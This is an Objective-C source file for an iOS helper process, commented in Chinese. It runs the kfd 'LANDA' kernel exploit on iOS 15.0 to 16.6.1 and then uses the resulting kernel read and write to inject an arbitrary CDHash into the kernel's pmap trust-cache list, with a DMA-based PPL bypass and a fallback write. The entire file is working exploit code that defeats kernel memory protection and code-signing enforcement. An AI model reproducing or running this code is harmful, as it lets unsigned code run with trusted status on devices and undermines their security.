//
//  FuckKfdHelper.m
//  独立子进程执行 kfd exploit trust cache 注入
//  通过 posix_spawn 从主 App 调用，崩溃不影响主进程
//
//  用法: FuckKfdHelper <cdhash_hex_40chars>
//  返回: 0=成功, 非0=失败
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <signal.h>
#import <unistd.h>
#import <fcntl.h>
#import <os/log.h>

#include "kfd/libkfd.h"
#include "kfd/pplrw.h"
#include "kfd/IOSurface_Primitives.h"
#include "kfd/kpf/patchfinder.h"
#include "kfd/trustcache_structs.h"

extern uint64_t dg_kalloc(size_t size);
extern void dg_kfree(uint64_t kaddr);

// SIGBUS/SIGSEGV handler: 干净退出，避免 core dump 触发 kernel race
static void kfd_signal_handler(int sig, siginfo_t *info, void *ctx) {
    char buf[256];
    int len = snprintf(buf, sizeof(buf),
        "\n[FATAL] sig=%d, si_code=%d, si_addr=%p, pid=%d\n",
        sig, info->si_code, info->si_addr, getpid());
    write(STDOUT_FILENO, buf, len);
    _exit(128 + sig);
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        if (argc < 2) {
            fprintf(stderr, "Usage: FuckKfdHelper <cdhash_hex>\n");
            return 1;
        }

        const char *hexStr = argv[1];
        if (strlen(hexStr) != 40) {
            fprintf(stderr, "CDHash must be 40 hex chars\n");
            return 1;
        }

        // 解析 CDHash hex
        uint8_t cdhash_bytes[20];
        for (int i = 0; i < 20; i++) {
            unsigned int val;
            sscanf(hexStr + i * 2, "%2x", &val);
            cdhash_bytes[i] = (uint8_t)val;
        }

        // 安装信号 handler
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_sigaction = kfd_signal_handler;
        sa.sa_flags = SA_SIGINFO;
        sigaction(SIGBUS, &sa, NULL);
        sigaction(SIGSEGV, &sa, NULL);

        printf("[kfd-helper] pid=%d, 信号 handler 已安装\n", getpid());
        printf("[kfd-helper] iOS version: %s\n", [[[UIDevice currentDevice] systemVersion] UTF8String]);
        usleep(100000); // 100ms 预热

        // 执行 kfd exploit
        extern uint64_t _kfd;
        printf("[kfd-helper] 调用 kopen(MEOW_EXPLOIT_LANDA, 0)...\n");
        uint64_t kfd_handle = kopen(MEOW_EXPLOIT_LANDA, 0);
        if (!kfd_handle) {
            fprintf(stderr, "[kfd-helper] ❌ LANDA exploit kopen 失败\n");
            fprintf(stderr, "[kfd-helper] 可能原因:\n");
            fprintf(stderr, "[kfd-helper]   1. iOS 版本不支持 (需要 iOS 15.0-16.6.1)\n");
            fprintf(stderr, "[kfd-helper]   2. 设备型号不支持\n");
            fprintf(stderr, "[kfd-helper]   3. 内核已打补丁\n");
            fprintf(stderr, "[kfd-helper]   4. 内存不足或系统不稳定\n");
            return 1;
        }

        _kfd = kfd_handle;
        printf("[kfd-helper] LANDA exploit 成功! kfd=0x%llx\n", kfd_handle);

        uint64_t kslide = get_kernel_slide();
        printf("[kfd-helper] kernel_slide=0x%llx\n", kslide);

        if (isarm64e()) {
            offset_exporter();
        }

        int result = 2; // default: failed

        if (kaddr_pmap_image4_trust_caches == 0) {
            fprintf(stderr, "[kfd-helper] pmap_image4_trust_caches 未找到\n");
        } else {
            uint64_t pmap_tc_slid = kaddr_pmap_image4_trust_caches + kslide;
            printf("[kfd-helper] pmap_image4_trust_caches (slid): 0x%llx\n", pmap_tc_slid);

            const size_t ENTRY_SIZE = 22;
            const size_t FILE_HEADER_SIZE = 24;
            const size_t MODULE_HEADER_SIZE = 0x28; // 40
            const size_t TOTAL_SIZE = MODULE_HEADER_SIZE + FILE_HEADER_SIZE + ENTRY_SIZE;

            uint64_t mem = dg_kalloc(1024);
            if (!mem) {
                fprintf(stderr, "[kfd-helper] kalloc 失败\n");
            } else {
                printf("[kfd-helper] kalloc: 0x%llx\n", mem);

                uint8_t tc_data[1024];
                memset(tc_data, 0, sizeof(tc_data));

                uint64_t *tc_module = (uint64_t *)tc_data;
                tc_module[0] = 0; // nextptr
                tc_module[1] = 0; // prevptr
                tc_module[2] = 0; // padding
                tc_module[3] = FILE_HEADER_SIZE + ENTRY_SIZE;
                tc_module[4] = mem + MODULE_HEADER_SIZE;

                uint32_t *file_header = (uint32_t *)(tc_data + MODULE_HEADER_SIZE);
                file_header[0] = 1; // version
                arc4random_buf(tc_data + MODULE_HEADER_SIZE + 4, 16);
                *(uint32_t *)(tc_data + MODULE_HEADER_SIZE + 0x14) = 1;

                uint8_t *tc_entry = tc_data + MODULE_HEADER_SIZE + FILE_HEADER_SIZE;
                memcpy(tc_entry, cdhash_bytes, 20);
                tc_entry[20] = 2; // CS_HASHTYPE_SHA256
                tc_entry[21] = 0; // flags

                size_t write_size = (TOTAL_SIZE + 7) & ~7ULL;
                kwritebuf_kfd(mem, tc_data, write_size);

                uint64_t current_head = kread64_ptr_kfd(pmap_tc_slid);
                printf("[kfd-helper] 当前链表头: 0x%llx\n", current_head);

                kwrite64_kfd(mem + 0, current_head);
                kwrite64_kfd(mem + 8, 0);
                if (current_head) {
                    kwrite64_kfd(current_head + 8, mem);
                }

                // DMA PPL bypass
                dma_perform(^{
                    dma_writevirt64(pmap_tc_slid, mem);
                });

                uint64_t new_head = kread64_ptr_kfd(pmap_tc_slid);
                if (new_head == mem) {
                    printf("[kfd-helper] Trust cache 注入成功!\n");
                    result = 0;
                } else {
                    printf("[kfd-helper] DMA 失败, fallback kwrite...\n");
                    kwrite64_kfd(pmap_tc_slid, mem);
                    new_head = kread64_ptr_kfd(pmap_tc_slid);
                    if (new_head == mem) {
                        printf("[kfd-helper] Fallback 成功!\n");
                        result = 0;
                    } else {
                        fprintf(stderr, "[kfd-helper] Trust cache 注入失败\n");
                    }
                }
            }
        }

        printf("[kfd-helper] result=%d, calling kclose...\n", result);
        kclose(kfd_handle);
        printf("[kfd-helper] kclose 完成\n");
        return result;
    }
}
